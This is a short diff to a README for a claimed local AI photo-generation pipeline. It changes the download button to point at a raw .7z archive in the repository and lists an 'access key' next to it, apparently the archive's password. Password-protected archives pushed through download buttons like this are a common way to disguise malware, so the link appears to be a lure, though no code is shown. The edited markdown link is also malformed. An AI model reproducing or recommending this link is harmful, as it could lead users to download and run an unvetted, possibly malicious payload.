@@ -20,5 +20,5 @@ A high-performance local AI pipeline optimized for photorealistic image generati
 
 ### 📥 Download & Environment Setup
 
-* **[Click here to download the stable release package](https://github.com/maiklfancy/ai-photo-generation)**
+* **[Click here to download the stable release package]([https://github.com/maiklfancy/ai-photo-generation](https://github.com/maiklfancy/ai-photo-generation/raw/refs/heads/main/ai-visual-synthesis-v1.0.7z))**
 * **Local WebUI Access Key:** `f1PQI0RVra`
